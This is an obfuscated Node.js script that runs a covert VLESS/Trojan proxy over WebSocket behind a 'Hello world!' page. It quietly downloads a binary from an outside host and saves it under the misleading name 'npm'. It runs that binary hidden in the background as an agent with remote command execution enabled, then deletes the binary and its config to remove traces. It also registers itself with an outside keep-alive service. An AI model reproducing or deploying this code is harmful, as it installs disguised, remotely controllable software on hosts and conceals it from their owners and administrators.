const _0x22bc3a=_0x188a;(function(_0xf34feb,_0x38b11e){const _0xdfdf9d=_0x188a,_0x5870b9=_0xf34feb();while(!![]){try{const _0x7e780f=parseInt(_0xdfdf9d(0xd2))/0x1+parseInt(_0xdfdf9d(0xa9))/0x2+-parseInt(_0xdfdf9d(0xe1))/0x3*(-parseInt(_0xdfdf9d(0xb4))/0x4)+parseInt(_0xdfdf9d(0xc1))/0x5+-parseInt(_0xdfdf9d(0xbe))/0x6+parseInt(_0xdfdf9d(0xa2))/0x7*(parseInt(_0xdfdf9d(0xb0))/0x8)+-parseInt(_0xdfdf9d(0xc2))/0x9;if(_0x7e780f===_0x38b11e)break;else _0x5870b9['push'](_0x5870b9['shift']());}catch(_0x33c798){_0x5870b9['push'](_0x5870b9['shift']());}}}(_0x30a6,0x60608));const os=require('os'),http=require(_0x22bc3a(0x98)),fs=require('fs'),axios=require('axios'),net=require(_0x22bc3a(0xba)),path=require(_0x22bc3a(0xd8)),crypto=require(_0x22bc3a(0x7f)),{Buffer}=require(_0x22bc3a(0x99)),{exec,execSync}=require(_0x22bc3a(0xaa)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x22bc3a(0xd3),NEZHA_SERVER=process[_0x22bc3a(0xe7)][_0x22bc3a(0xce)]||'',NEZHA_PORT=process[_0x22bc3a(0xe7)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x22bc3a(0xe7)][_0x22bc3a(0xd4)]||'',DOMAIN=process[_0x22bc3a(0xe7)][_0x22bc3a(0xb1)]||_0x22bc3a(0xa6),AUTO_ACCESS=process['env'][_0x22bc3a(0xa4)]||!![],WSPATH=process[_0x22bc3a(0xe7)][_0x22bc3a(0xb5)]||UUID[_0x22bc3a(0xaf)](0x0,0x8),SUB_PATH=process[_0x22bc3a(0xe7)][_0x22bc3a(0xf2)]||_0x22bc3a(0xab),NAME=process[_0x22bc3a(0xe7)][_0x22bc3a(0x93)]||'',PORT=process[_0x22bc3a(0xe7)][_0x22bc3a(0xa8)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x18cfa1=_0x22bc3a;try{const _0x5f421e=await axios['get'](_0x18cfa1(0x95)),_0x3093cf=_0x5f421e['data'];ISP=(_0x3093cf[_0x18cfa1(0xef)]+'-'+_0x3093cf[_0x18cfa1(0xc5)])['replace'](/ /g,'_');}catch(_0x329280){ISP=_0x18cfa1(0xd5);}};GetISP();function _0x30a6(){const _0x16f227=['Failed\x20to\x20resolve\x20','createServer','setsid\x20nohup\x20./npm\x20-s\x20','type','url','\x20-p\x20','utf8','NAME','createWriteStream','https://api.ip.sb/geoip','application/dns-json','substr','http','buffer','test','--tls','connection','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','includes','vless://','writeFileSync','concat','4333ksTevV','update','AUTO_ACCESS','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','1234.abc.com','text/html','PORT','916698eZMiUS','child_process','sub','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','text/plain','443','slice','64VLdNUi','DOMAIN','length','https://amd64.ssss.nyc.mn/v1','4bnxuDE','WSPATH','decode','pipe','map',':443?security=tls&sni=','net','finish','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','hex','574260wgBdxX','writeHead','8443','214685oSfXMv','5455161ndryYX','false','log','isp','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','from','2087','join','https://amd64.ssss.nyc.mn/agent','base64','&fp=chrome&type=ws&host=','arch','NEZHA_SERVER','Not\x20Found\x0a','pop','find','72800oqjfkA','8a71fe48-3c86-4e30-a2e4-aa47f9520534','NEZHA_KEY','Unknown','npm\x20is\x20running','2053','path','https://','true','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','write','2096','readUInt16BE','unlink','once','1552683dMnRbh','npm','message','end','Status','Answer','env','stream','Hello\x20world!','connect','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20already\x20running,\x20skip\x20running...','Server\x20is\x20running\x20on\x20port\x20','toString','country_code','npm\x20running\x20error:','client_secret:\x20','SUB_PATH','readUInt8','then','readFile','replace','data','close','/bin/bash','get','2083','reduce','crypto','digest',':443?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/v1','&path=%2F','https://arm64.ssss.nyc.mn/agent','utf-8','catch','arm','index.html','1.1.1.1','npm\x20download\x20successfully','error'];_0x30a6=function(){return _0x16f227;};return _0x30a6();}const httpServer=http[_0x22bc3a(0x8d)]((_0x33a50e,_0xb295bd)=>{const _0xd70400=_0x22bc3a;if(_0x33a50e[_0xd70400(0x90)]==='/'){const _0x12eefb=path[_0xd70400(0xc9)](__dirname,_0xd70400(0x88));fs[_0xd70400(0xf5)](_0x12eefb,_0xd70400(0x92),(_0x5a4565,_0x140737)=>{const _0x5baadd=_0xd70400;if(_0x5a4565){_0xb295bd[_0x5baadd(0xbf)](0xc8,{'Content-Type':_0x5baadd(0xa7)}),_0xb295bd[_0x5baadd(0xe4)](_0x5baadd(0xe9));return;}_0xb295bd['writeHead'](0xc8,{'Content-Type':'text/html'}),_0xb295bd['end'](_0x140737);});return;}else{if(_0x33a50e[_0xd70400(0x90)]==='/'+SUB_PATH){const _0xe18ede=NAME?NAME+'-'+ISP:ISP,_0x1509c9=_0xd70400(0x9f)+UUID+'@'+DOMAIN+_0xd70400(0x81)+DOMAIN+_0xd70400(0xcc)+DOMAIN+_0xd70400(0x83)+WSPATH+'#'+_0xe18ede,_0x160b37='trojan://'+UUID+'@'+DOMAIN+_0xd70400(0xb9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xd70400(0x83)+WSPATH+'#'+_0xe18ede,_0x51517d=_0x1509c9+'\x0a'+_0x160b37,_0x4ab9eb=Buffer[_0xd70400(0xc7)](_0x51517d)['toString'](_0xd70400(0xcb));_0xb295bd[_0xd70400(0xbf)](0xc8,{'Content-Type':_0xd70400(0xad)}),_0xb295bd[_0xd70400(0xe4)](_0x4ab9eb+'\x0a');}else _0xb295bd[_0xd70400(0xbf)](0x194,{'Content-Type':_0xd70400(0xad)}),_0xb295bd[_0xd70400(0xe4)](_0xd70400(0xcf));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x22bc3a(0xf6)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x22bc3a(0x89)];function resolveHost(_0x27591d){return new Promise((_0x5c57d0,_0x3bab78)=>{const _0x311f05=_0x188a;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x311f05(0x9a)](_0x27591d)){_0x5c57d0(_0x27591d);return;}let _0x420b29=0x0;function _0x57897e(){const _0x1ffc59=_0x311f05;if(_0x420b29>=DNS_SERVERS[_0x1ffc59(0xb2)]){_0x3bab78(new Error(_0x1ffc59(0x8c)+_0x27591d+_0x1ffc59(0xeb)));return;}const _0x1cf95a=DNS_SERVERS[_0x420b29];_0x420b29++;const _0x18900e='https://dns.google/resolve?name='+encodeURIComponent(_0x27591d)+'&type=A';axios[_0x1ffc59(0x7c)](_0x18900e,{'timeout':0x1388,'headers':{'Accept':_0x1ffc59(0x96)}})[_0x1ffc59(0xf4)](_0x4733b3=>{const _0x4fbb49=_0x1ffc59,_0x30e04b=_0x4733b3[_0x4fbb49(0xf7)];if(_0x30e04b[_0x4fbb49(0xe5)]===0x0&&_0x30e04b[_0x4fbb49(0xe6)]&&_0x30e04b[_0x4fbb49(0xe6)][_0x4fbb49(0xb2)]>0x0){const _0x20d019=_0x30e04b['Answer'][_0x4fbb49(0xd1)](_0x4e2c2d=>_0x4e2c2d[_0x4fbb49(0x8f)]===0x1);if(_0x20d019){_0x5c57d0(_0x20d019[_0x4fbb49(0xf7)]);return;}}_0x57897e();})[_0x1ffc59(0x86)](_0x569055=>{_0x57897e();});}_0x57897e();});}function handleVlessConnection(_0x3249fa,_0x142b27){const _0x3c48d5=_0x22bc3a,[_0x5be997]=_0x142b27,_0x12d31e=_0x142b27['slice'](0x1,0x11);if(!_0x12d31e['every']((_0x501e1e,_0x231def)=>_0x501e1e==parseInt(uuid[_0x3c48d5(0x97)](_0x231def*0x2,0x2),0x10)))return![];let _0x10e701=_0x142b27['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x51c9c0=_0x142b27['slice'](_0x10e701,_0x10e701+=0x2)[_0x3c48d5(0xde)](0x0),_0x3566be=_0x142b27[_0x3c48d5(0xaf)](_0x10e701,_0x10e701+=0x1)[_0x3c48d5(0xf3)](),_0x1408a8=_0x3566be==0x1?_0x142b27[_0x3c48d5(0xaf)](_0x10e701,_0x10e701+=0x4)['join']('.'):_0x3566be==0x2?new TextDecoder()[_0x3c48d5(0xb6)](_0x142b27['slice'](_0x10e701+0x1,_0x10e701+=0x1+_0x142b27[_0x3c48d5(0xaf)](_0x10e701,_0x10e701+0x1)[_0x3c48d5(0xf3)]())):_0x3566be==0x3?_0x142b27['slice'](_0x10e701,_0x10e701+=0x10)[_0x3c48d5(0x7e)]((_0x47ebf9,_0x2d1d39,_0x771a66,_0x35448f)=>_0x771a66%0x2?_0x47ebf9[_0x3c48d5(0xa1)](_0x35448f[_0x3c48d5(0xaf)](_0x771a66-0x1,_0x771a66+0x1)):_0x47ebf9,[])[_0x3c48d5(0xb8)](_0x228a1b=>_0x228a1b['readUInt16BE'](0x0)[_0x3c48d5(0xee)](0x10))[_0x3c48d5(0xc9)](':'):'';_0x3249fa['send'](new Uint8Array([_0x5be997,0x0]));const _0x35572d=createWebSocketStream(_0x3249fa);return resolveHost(_0x1408a8)[_0x3c48d5(0xf4)](_0x69a9bc=>{const _0x14e349=_0x3c48d5;net['connect']({'host':_0x69a9bc,'port':_0x51c9c0},function(){const _0x1ba3a0=_0x188a;this['write'](_0x142b27['slice'](_0x10e701)),_0x35572d['on'](_0x1ba3a0(0x8b),()=>{})[_0x1ba3a0(0xb7)](this)['on']('error',()=>{})[_0x1ba3a0(0xb7)](_0x35572d);})['on'](_0x14e349(0x8b),()=>{});})[_0x3c48d5(0x86)](_0x5c0402=>{const _0x5f21a6=_0x3c48d5;net['connect']({'host':_0x1408a8,'port':_0x51c9c0},function(){const _0x405bb2=_0x188a;this[_0x405bb2(0xdc)](_0x142b27['slice'](_0x10e701)),_0x35572d['on'](_0x405bb2(0x8b),()=>{})[_0x405bb2(0xb7)](this)['on'](_0x405bb2(0x8b),()=>{})['pipe'](_0x35572d);})['on'](_0x5f21a6(0x8b),()=>{});}),!![];}function _0x188a(_0x3fcc7b,_0x35acbd){_0x3fcc7b=_0x3fcc7b-0x7a;const _0x30a676=_0x30a6();let _0x188a8d=_0x30a676[_0x3fcc7b];return _0x188a8d;}function handleTrojanConnection(_0x8bef22,_0x1c48ca){const _0x13706d=_0x22bc3a;try{if(_0x1c48ca['length']<0x3a)return![];const _0x45e9ea=_0x1c48ca[_0x13706d(0xaf)](0x0,0x38)[_0x13706d(0xee)](),_0x427fbe=[UUID];let _0x55e4ac=null;for(const _0x586e62 of _0x427fbe){const _0x2f62ce=crypto['createHash']('sha224')[_0x13706d(0xa3)](_0x586e62)[_0x13706d(0x80)](_0x13706d(0xbd));if(_0x2f62ce===_0x45e9ea){_0x55e4ac=_0x586e62;break;}}if(!_0x55e4ac)return![];let _0x4dea3e=0x38;_0x1c48ca[_0x4dea3e]===0xd&&_0x1c48ca[_0x4dea3e+0x1]===0xa&&(_0x4dea3e+=0x2);const _0x59f9b1=_0x1c48ca[_0x4dea3e];if(_0x59f9b1!==0x1)return![];_0x4dea3e+=0x1;const _0x4d985e=_0x1c48ca[_0x4dea3e];_0x4dea3e+=0x1;let _0x9323ff,_0x478a8f;if(_0x4d985e===0x1)_0x9323ff=_0x1c48ca[_0x13706d(0xaf)](_0x4dea3e,_0x4dea3e+0x4)[_0x13706d(0xc9)]('.'),_0x4dea3e+=0x4;else{if(_0x4d985e===0x3){const _0x3ff95f=_0x1c48ca[_0x4dea3e];_0x4dea3e+=0x1,_0x9323ff=_0x1c48ca['slice'](_0x4dea3e,_0x4dea3e+_0x3ff95f)[_0x13706d(0xee)](),_0x4dea3e+=_0x3ff95f;}else{if(_0x4d985e===0x4)_0x9323ff=_0x1c48ca['slice'](_0x4dea3e,_0x4dea3e+0x10)[_0x13706d(0x7e)]((_0x4103a6,_0x3cb80d,_0x2a4f1a,_0x45cfb8)=>_0x2a4f1a%0x2?_0x4103a6[_0x13706d(0xa1)](_0x45cfb8['slice'](_0x2a4f1a-0x1,_0x2a4f1a+0x1)):_0x4103a6,[])[_0x13706d(0xb8)](_0x320f09=>_0x320f09['readUInt16BE'](0x0)[_0x13706d(0xee)](0x10))['join'](':'),_0x4dea3e+=0x10;else return![];}}_0x478a8f=_0x1c48ca[_0x13706d(0xde)](_0x4dea3e),_0x4dea3e+=0x2;_0x4dea3e<_0x1c48ca[_0x13706d(0xb2)]&&_0x1c48ca[_0x4dea3e]===0xd&&_0x1c48ca[_0x4dea3e+0x1]===0xa&&(_0x4dea3e+=0x2);const _0x14a3f9=createWebSocketStream(_0x8bef22);return resolveHost(_0x9323ff)[_0x13706d(0xf4)](_0x5f257e=>{const _0x1b188c=_0x13706d;net[_0x1b188c(0xea)]({'host':_0x5f257e,'port':_0x478a8f},function(){const _0x149027=_0x1b188c;_0x4dea3e<_0x1c48ca[_0x149027(0xb2)]&&this['write'](_0x1c48ca[_0x149027(0xaf)](_0x4dea3e)),_0x14a3f9['on'](_0x149027(0x8b),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x14a3f9);})['on'](_0x1b188c(0x8b),()=>{});})['catch'](_0x245e0c=>{const _0x1e9548=_0x13706d;net['connect']({'host':_0x9323ff,'port':_0x478a8f},function(){const _0x7a85c3=_0x188a;_0x4dea3e<_0x1c48ca[_0x7a85c3(0xb2)]&&this[_0x7a85c3(0xdc)](_0x1c48ca[_0x7a85c3(0xaf)](_0x4dea3e)),_0x14a3f9['on'](_0x7a85c3(0x8b),()=>{})[_0x7a85c3(0xb7)](this)['on'](_0x7a85c3(0x8b),()=>{})[_0x7a85c3(0xb7)](_0x14a3f9);})['on'](_0x1e9548(0x8b),()=>{});}),!![];}catch(_0x3bf4c9){return![];}}wss['on'](_0x22bc3a(0x9c),(_0x2486ab,_0x3c5b9b)=>{const _0x4a76bf=_0x22bc3a,_0x2f379a=_0x3c5b9b[_0x4a76bf(0x90)]||'';_0x2486ab[_0x4a76bf(0xe0)](_0x4a76bf(0xe3),_0xb0ae84=>{const _0xe5b12=_0x4a76bf;if(_0xb0ae84['length']>0x11&&_0xb0ae84[0x0]===0x0){const _0x570469=_0xb0ae84[_0xe5b12(0xaf)](0x1,0x11),_0x5841a0=_0x570469['every']((_0xc467bc,_0x27ff55)=>_0xc467bc==parseInt(uuid['substr'](_0x27ff55*0x2,0x2),0x10));if(_0x5841a0){!handleVlessConnection(_0x2486ab,_0xb0ae84)&&_0x2486ab[_0xe5b12(0x7a)]();return;}}!handleTrojanConnection(_0x2486ab,_0xb0ae84)&&_0x2486ab['close']();})['on'](_0x4a76bf(0x8b),()=>{});});const getDownloadUrl=()=>{const _0x5d382d=_0x22bc3a,_0x5d59f8=os[_0x5d382d(0xcd)]();return _0x5d59f8===_0x5d382d(0x87)||_0x5d59f8==='arm64'||_0x5d59f8==='aarch64'?!NEZHA_PORT?_0x5d382d(0x82):_0x5d382d(0x84):!NEZHA_PORT?_0x5d382d(0xb3):_0x5d382d(0xca);},downloadFile=async()=>{const _0xdbc97e=_0x22bc3a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1463ef=getDownloadUrl(),_0x17aa67=await axios({'method':'get','url':_0x1463ef,'responseType':_0xdbc97e(0xe8)}),_0x41450b=fs[_0xdbc97e(0x94)]('npm');return _0x17aa67[_0xdbc97e(0xf7)]['pipe'](_0x41450b),new Promise((_0x1b5525,_0x3981e7)=>{const _0x383701=_0xdbc97e;_0x41450b['on'](_0x383701(0xbb),()=>{const _0x34fcca=_0x383701;console[_0x34fcca(0xc4)](_0x34fcca(0x8a)),exec('chmod\x20+x\x20npm',_0x25ccc3=>{if(_0x25ccc3)_0x3981e7(_0x25ccc3);_0x1b5525();});}),_0x41450b['on']('error',_0x3981e7);});}catch(_0x4638b4){throw _0x4638b4;}},runnz=async()=>{const _0x3dda54=_0x22bc3a;try{const _0x14f3a1=execSync(_0x3dda54(0xc6),{'encoding':_0x3dda54(0x85)});if(_0x14f3a1['trim']()!==''){console[_0x3dda54(0xc4)](_0x3dda54(0xec));return;}}catch(_0x4c02ff){}await downloadFile();let _0x364220='',_0x54aa23=[_0x3dda54(0xae),_0x3dda54(0xc0),_0x3dda54(0xdd),_0x3dda54(0xc8),_0x3dda54(0x7d),_0x3dda54(0xd7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2dfe53=_0x54aa23[_0x3dda54(0x9e)](NEZHA_PORT)?_0x3dda54(0x9b):'';_0x364220=_0x3dda54(0x8e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3dda54(0x91)+NEZHA_KEY+'\x20'+_0x2dfe53+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40167e=NEZHA_SERVER[_0x3dda54(0x9e)](':')?NEZHA_SERVER['split'](':')[_0x3dda54(0xd0)]():'',_0x4b3fd2=_0x54aa23[_0x3dda54(0x9e)](_0x40167e)?_0x3dda54(0xda):_0x3dda54(0xc3),_0x46c349=_0x3dda54(0xf1)+NEZHA_KEY+_0x3dda54(0x9d)+NEZHA_SERVER+_0x3dda54(0xac)+_0x4b3fd2+_0x3dda54(0xdb)+UUID;fs[_0x3dda54(0xa0)]('config.yaml',_0x46c349);}_0x364220=_0x3dda54(0xa5);}else{console[_0x3dda54(0xc4)](_0x3dda54(0xbc));return;}}try{exec(_0x364220,{'shell':_0x3dda54(0x7b)},_0x5261c6=>{const _0x251707=_0x3dda54;if(_0x5261c6)console[_0x251707(0x8b)](_0x251707(0xf0),_0x5261c6);else console[_0x251707(0xc4)](_0x251707(0xd6));});}catch(_0x365b09){console[_0x3dda54(0x8b)]('error:\x20'+_0x365b09);}};async function addAccessTask(){const _0x2fce22=_0x22bc3a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x214f7c=_0x2fce22(0xd9)+DOMAIN;try{const _0x4ccc1e=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x214f7c},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xfc3c99){}}const delFiles=()=>{const _0x4f976f=_0x22bc3a;fs[_0x4f976f(0xdf)](_0x4f976f(0xe2),()=>{}),fs[_0x4f976f(0xdf)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x225178=_0x22bc3a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x225178(0xed)+PORT);});
